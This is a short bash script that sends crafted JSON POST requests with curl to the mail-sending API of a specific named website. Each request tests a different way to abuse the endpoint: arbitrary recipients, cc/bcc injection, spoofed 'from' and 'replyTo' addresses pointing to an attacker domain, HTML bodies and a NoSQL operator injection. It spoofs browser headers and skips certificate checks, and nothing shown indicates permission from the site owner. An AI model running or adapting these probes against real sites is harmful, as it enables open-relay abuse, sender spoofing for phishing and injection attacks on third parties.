#!/bin/bash
H='https://www.infinitycapital.bh'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
j(){ desc="$1"; shift; echo "=== $desc"; curl -sk -X POST "$H/api/send" -A "$UA" -H "Referer: $H/contact" -H "Content-Type: application/json" -d "$1" -w "\n<<code=%{http_code}>>\n" | head -c 600; echo; sleep 2; }
j "to valid + subject + text" '{"to":"scanner.inbox@nothing.local","subject":"probe","text":"probe body"}'
j "cc/bcc fields" '{"to":"scanner.inbox@nothing.local","cc":"a@nothing.local","bcc":"b@nothing.local","subject":"p","text":"p"}'
j "from override" '{"to":"scanner.inbox@nothing.local","from":"attacker@evil.example","subject":"p","text":"p"}'
j "replyTo override" '{"to":"scanner.inbox@nothing.local","replyTo":"attacker@evil.example","subject":"p","text":"p"}'
j "html field" '{"to":"scanner.inbox@nothing.local","subject":"p","html":"<b>x</b>","text":"p"}'
j "nested object" '{"to":{"a":"b"},"subject":{"$ne":1}}'
j "empty body" '{}'
